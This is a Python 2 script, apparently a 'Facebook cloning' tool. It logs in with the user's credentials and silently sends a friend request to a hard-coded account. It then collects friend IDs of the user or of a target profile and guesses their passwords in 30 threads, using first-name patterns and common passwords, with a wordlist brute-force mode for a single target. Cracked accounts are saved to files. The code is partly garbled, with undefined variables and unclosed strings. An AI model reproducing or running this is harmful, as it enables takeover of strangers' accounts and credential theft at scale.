#!/usr/bin/python2

#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
print "\033[1;96m[!] \x1b[1;91mExit"	os.sys.exit()	

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!'+w[random.randint(0,len(w)-1)]+i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))

    x += '\033[0m'

    x = x.replace('!0','\033[0m')

    sys.stdout.write(x+'\n')

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(00000.1)

#### LOGO ####

logo = """

\x1b[1;94m  MARWAT . . . . .TRICKS

\x1b[1;94m 
┈┈┈╲┈┈┈┈╱

┈┈┈╱     ▔▔╲

┈┈┃┈▇┈┈▇┈┃

╭╮┣━━━━━━┫╭╮

┃┃┃┈┈┈┈┈┈┃┃┃

╰╯┃┈┈┈┈┈┈┃╰╯

┈┈╰┓┏━━┓┏╯

┈┈┈╰╯┈┈╰╯



\033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗

\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;33mZulfiqar_Baloch_\033[0;35m║

\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[3mhttps://Github.com/zulfiqarbalochtricker007\033[0m \033[0;33m║

\033[0;39m║\033[0;36m* \033[0;32mFacebook \033[1;32m: \033[1;32mBaloch Tircker\033[0;33m║

def tik():

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0

berhasil = []

cekpoint = []
oks = []

id = []

listgrup = []

vulnot = "\033[31mNot Vuln"

vuln = "\033[32mVuln"

os.system("clear")

print "\x1b[0;31m⚔════════════════════════☠════════════════════════⚔"

print  """\x1b[0;31m [¤] \x1b[0;31mFree fire King\x1b[0;31m  \033[1;96m   
\x1b[0;35m ─▄████▄████▄

\x1b[0;33m ██▒▒▒▒█▒▒▒▒██

\x1b[0;34m ▀██▒ ▒▒▒▒▒██▀

\x1b[0;36m ─▀██▒▒▒▒▒██▀

\x1b[0;32m ───▀██▒██▀

\x1b[0;36m ─────▀█▀

print " \x1b[1;93m⚔═══════════════════════☠════════════════════════⚔"

CorrectUsername = "free"

CorrectPassword = "fire"

loop = 'true'

while (loop == 'true'):

    username = raw_input("\033[1;92m[☆] \x1b[0;31mUSERNAME TOOLS INI \x1b[1;96m>>>> ")

    if (username == CorrectUsername):

    	password = raw_input("\033[1;96m[☆] \x1b[0;31mPASSWORD TOOLS INI \x1b[1;96m>>>> ")

        if (password == CorrectPassword):

            print "Logged in successfully as " + username

            loop = 'false'

        else:

            print "yang bener dong"

            os.system('xdg-open https://www.facebook.com/HACKER.IS.BACK4')
    else:

        print "salah sayang!"

        os.system('xdg-open https://www.facebook.com/HACKER.IS.BACK4 ')

def login():

	os.system('clear')

	try:

		toket = open('login.txt','r')

		menu() 

	except (KeyError,IOError):

		os.system('clear')

		print logo

		print 42*"\033[1;96m="

		print('\033[1;96m[☆] \x1b[1;92mlogin facebook accont \x1b[1;92m[☆]' )

		id = raw_input('\033[1;92m[+] \x1b[0;34mID/Email \x1b[1;92m: \x1b[1;92m')

		pwd = raw_input('\033[1;94m[+] \x1b[0;34mPassword \x1b[1;94m: \x1b[1;94m')

		tik()

		try:

			br.open('https://m.facebook.com')

		except mechanize.URLError:

			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"

			keluar()

		br._factory.is_html = True

		br.select_form(nr=0)

		br.form['email'] = id

		br.form['pass'] = pwd

		br.submit()

		url = br.geturl()

		if 'save-device' in url:

			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'

				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}

				x=hashlib.new("md5")

				x.update(sig)

				a=x.hexdigest()

				data.update({'sig':a})

				url = "https://api.facebook.com/restserver.php"

				r=requests.get(url,params=data)

				z=json.loads(r.text)

				unikers = open("login.txt", 'w')

				unikers.write(z['access_token'])

				unikers.close()

				print '\n\x1b[1;36;40m[✓] Login Successful...'

				os.system('xdg-open https://www.facebook.com/HACKER.IS.BACK4 ')

				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])

				menu()

			except requests.exceptions.ConnectionError:

				print"\n\x1b[1;91m[!] There is no internet connection"

				keluar()

		if 'checkpoint' in url:

			print("\n\x1b[1;92m[!] Your Account is on Checkpoint")

			os.system('rm -rf login.txt')

			time.sleep(1)

			keluar()

		else:

			print("\n\x1b[1;93mPassword/Email is wrong")

			os.system('rm -rf login.txt')

			time.sleep(1)

			login()

def menu():

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		os.system('clear')

		print"\x1b[1;91m[!] Token invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		nama = a['name']

		id = a['id']

		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)

		b = json.loads(ots.text)

		sub = str(b['summary']['total_count'])

	except KeyError:

		os.system('clear')

		print"\033[1;91mYour Account is on Checkpoint"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	except requests.exceptions.ConnectionError:

		print"\x1b[1;92mThere is no internet connection"

		keluar()

	os.system("clear")

	print logo

	print "   \033[1;36;40m      ╔═════════════════════════════════╗"

	print "   \033[1;36;40m      ║\033[1;32;41m[*] Name\033[1;32;41m: "+nama+"  	   \033[1;36;41m║"                               

	print "   \033[1;36;41m      ║\033[1;34;41m[*] ID  \033[1;34;41m: "+id+"        \033[1;36;41m║"

	print "   \033[1;36;41m      ║\033[1;34;41m[*] Subs\033[1;34;41m: "+sub+"                      \033[1;36;41m║"

	print "   \033[1;36;41m      ╚═════════════════════════════════╝"

	print "\033[1;32;40m[1] \033[1;33;43m══Start Cloning"	

	print "\033[1;32;40m[2] \033[1;33;43m══enjoy"																														

	print "\033[1;32;40m[0] \033[1;33;43m══Log out"

	pilih()

def pilih():

	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")

	if unikers =="":

		print "\x1b[1;91mFill in correctly"

		pilih()

	elif unikers =="1":

		super()

	elif unikers =="2":

		os.system('xdg-open https://www.facebook.com/HACKER.IS.BACK4')

	elif unikers =="0":

		jalan('Token Removed')

		os.system('rm -rf login.txt')

		keluar()

	else:

		print "\x1b[1;92mFill in correctly"

		pilih()

def super():

	global toket

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		print"\x1b[1;92mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	os.system('clear')

	print logo

	print "\x1b[1;32;43m[A] \033[1;33;41m----clone From Friend List"

	print "\x1b[1;32;43m[B] \033[1;33;41m-----clone From Public ID"

	print "\x1b[1;32;43m[C] \033[1;33;41m-----clone Bruteforce"

	print "\x1b[1;32;43m[D] \033[1;33;41m------clone From File"

	print "\x1b[1;32;43m[E] \033[1;33;41m--------exit"

	pilih_super()

def pilih_super():

	peak = raw_input("\n\033[1;31;42m>>> \033[1;93m")

	if peak =="":

		print "\x1b[1;92mFill in correctly"

		pilih_super()

	elif peak =="1":

		os.system('clear')

		print logo

		jalan('\033[1;92m[✺] Getting IDs Baloch hacker \033[1;92m...')

		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)

		z = json.loads(r.text)

		for s in z['data']:

			id.append(s['id'])

	elif peak =="2":

		os.system('clear')

		print logo

		idt = raw_input("\033[1;91m[*] Enter link ID : ")

		try:

			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)

			op = json.loads(jok.text)

			print"\033[1;31;44m[✺] Name : "+op["name"]

		except KeyError:

			print"\x1b[1;93m[✺] ID Not Found!"

			raw_input("\n\033[1;95m[\033[1;93mBack\033[1;91m]")

			super()

		print"\033[1;35;41m[✺] Getting IDs..."

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)

		z = json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

	elif peak =="3":

		os.system('clear')

		print logo

		brute()	

	elif peak =="4":

		os.system('clear')

		print logo                  

		try:

			idlist = raw_input('\x1b[1;91m[+] \x1b[1;91mEnter the file name \x1b[1;91m: \x1b[1;91m')

			for line in open(idlist,'r').readlines():

				id.append(line.strip())

		except IOError:

			print '\x1b[1;35;41m[!] \x1b[1;35;41mFile not found'

			raw_input('\n\x1b[1;35;42m[ \x1b[1;35;42mExit \x1b[1;35;42m]')

			super()

	elif peak =="0":

		menu()

	else:

		print "\x1b[1;91mFill in correctly"

		pilih_super()

	

	print "\033[1;36;42m[✺] Total IDs : \033[1;92m"+str(len(id))

	jalan('\033[1;34;42m[✺] Please Wait...')

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\033[1;32;43m[✺] Cloning\033[1;94m"+o),;sys.stdout.flush();time.sleep(1)

	print "\n\033[1;92m        ❈     \x1b[1;92mTo Stop Process Press CTRL+Z \033[1;92m    ❈"

	print "   \033[1;31;48m●══════════════════════Baloch--Starting--zone══════════════════════●"

	jalan('            \033[1;91mBaloch start cloning Wait...')

	print  "  \033[1;36;48m ●══════════════════════MUNNA--TO--BS--FEEL--KAR══════════════════════●" 

	def main(arg):

		global cekpoint,oks

		user = arg

		try:

			os.mkdir('out')

		except OSError:

			pass 

		try:

			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)

			b = json.loads(a.text)

			pass1 = b['first_name'] + '786'

			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

			q = json.load(data)

			if 'access_token' in q:

				print '\x1b[1;91m[OK] \x1b[1;93mID \x1b[1;93m✯ \x1b[1;93m' + user + ' \x1b[1;93mPass \x1b[1;93m✯ \x1b[1;93m' + pass1 + '\n'

				oks.append(user+pass1)

			else:

				if 'www.facebook.com' in q["error_msg"]:

					print '\x1b[1;93m[chik-pont] \x1b[1;93mID \x1b[1;93m✯ \x1b[1;93m' + user + ' \x1b[1;93mPass \x1b[1;93m✯ \x1b[1;93m' + pass1 + '\n'

					cek = open("out/CP.txt", "a")

					cek.write(user+"|"+pass1+"\n")

					cek.close()

					cekpoint.append(user+pass1)

				else:

					pass2 = b['first_name'] + '123'

					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

					q = json.load(data)

					if 'access_token' in q:

						print '\x1b[1;91m[ok--baloch] \x1b[1;91mID \x1b[1;91m✯ \x1b[1;91m' + user + ' \x1b[1;91mPass \x1b[1;91m✯ \x1b[1;91m' + pass2 + '\n'

						oks.append(user+pass2)

					else:

						if 'www.facebook.com' in q["error_msg"]:

							print '\x1b[1;97m[cp--id] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass2 + '\n'

							cek = open("out/CP.txt", "a")

							cek.write(user+"|"+pass2+"\n")

							cek.close()

							cekpoint.append(user+pass2)

						else:

							pass3 = 'Pakistan123'

							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

							q = json.load(data)

							if 'access_token' in q:

								print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass3 + '\n'

								oks.append(user+pass3)

							else:

								if 'www.facebook.com' in q["error_msg"]:

									print '\x1b[1;97m[CP] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass3 + '\n'

									cek = open("out/CP.txt", "a")

									cek.write(user+"|"+pass3+"\n")

									cek.close()

									cekpoint.append(user+pass3)

								else:

									pass4 = '445566'

									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

									q = json.load(data)

									if 'access_token' in q:

										print '\x1b[1;92m[OK] \x1b[1;95mID \x1b[1;95m✯ \x1b[1;95m' + user + ' \x1b[1;95mPass \x1b[1;95m✯ \x1b[1;95m' + pass4 + '\n'

										oks.append(user+pass4)

									else:

										if 'www.facebook.com' in q["error_msg"]:

											print '\x1b[1;97m[Chik pont] \x1b[1;91mID \x1b[1;91m✯ \x1b[1;92m' + user + ' \x1b[1;94mPass \x1b[1;97m✯ \x1b[1;96m' + pass4 + '\n'

											cek = open("out/CP.txt", "a")

											cek.write(user+"|"+pass4+"\n")

											cek.close()

											cekpoint.append(user+pass4)

										else:

											pass5 = '786786'

											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

											q = json.load(data)

											if 'access_token' in q:

												print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass5 + '\n'

												oks.append(user+pass5)

											else:

												if 'www.facebook.com' in q["error_msg"]:

													print '\x1b[1;97m[CP] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass5 + '\n'

													cek = open("out/CP.txt", "a")

													cek.write(user+"|"+pass5+"\n")

													cek.close()

													cekpoint.append(user+pass5)

												else:

													pass6 = '223344'

													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

													q = json.load(data)

													if 'access_token' in q:

														print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass6 + '\n'

														oks.append(user+pass6)

													else:

														if 'www.facebook.com' in q["error_msg"]:

															print '\x1b[1;97m[CP] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass6 + '\n'

															cek = open("out/CP.txt", "a")

															cek.write(user+"|"+pass6+"\n")

															cek.close()

															cekpoint.append(user+pass6)

 										

		except:																		

			pass
		

	p = ThreadPool(30)

	p.map(main, id) 

	

	print '\033[1;31;41m[✓] Process Has Been Completed\033[1;91m....'

	print "\033[1;32;41m[+] Total OK/\x1b[1;93mchik pont \033[1;94m: \033[1;94m"+str(len(oks))+"\033[1;31;41m/\033[1;36;41m"+str(len(cekpoint))

	print '\033[1;34;41m[+] CP File Has Been Saved : save/cp.txt'

	print """

\033[1;31;41m ●═════════════════════Baloch-hacker═══════════════════════●	           """

	raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")

	super()

def brute():

    os.system('clear')

    try:

        toket = open('login.txt', 'r').read()

    except IOError:

        print '\x1b[1;91m[!] Token not found'

        os.system('rm -rf login.txt')

        time.sleep(0.5)

        login()

    else:

        os.system('clear')

        print logo

        print '\033[1;31;40m ●════════════════════════☠════════════════════════●'

        try:

            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')

            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')

            total = open(passw, 'r')

            total = total.readlines()

            print '\033[1;31;40m ●════════════════════════☠════════════════════════●'

            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email

            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'

            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')

            sandi = open(passw, 'r')

            for pw in sandi:

                try:

                    pw = pw.replace('\n', '')

                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)

                    sys.stdout.flush()

                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

                    mpsh = json.loads(data.text)

                    if 'access_token' in mpsh:

                        dapat = open('Brute.txt', 'w')

                        dapat.write(email + ' | ' + pw + '\n')

                        dapat.close()

                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'

                        print 52 * '\x1b[1;97m\xe2\x95\x90'

                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email

                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw

                        keluar()

                    else:

                        if 'www.facebook.com' in mpsh['error_msg']:

                            ceks = open('Brutecekpoint.txt', 'w')

                            ceks.write(email + ' | ' + pw + '\n')

                            ceks.close()

                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'

                            print  "\033[1;36;40m ●════════════════════════☠════════════════════════●"

                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'

                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email

                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw

                            keluar()

                except requests.exceptions.ConnectionError:

                    print '\x1b[1;91m[!] Connection Error'

                    time.sleep(1)

        except IOError:

            print '\x1b[1;91m[!] File not found...'

            print """\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"""

            super()

if __name__ == '__main__':

	login()
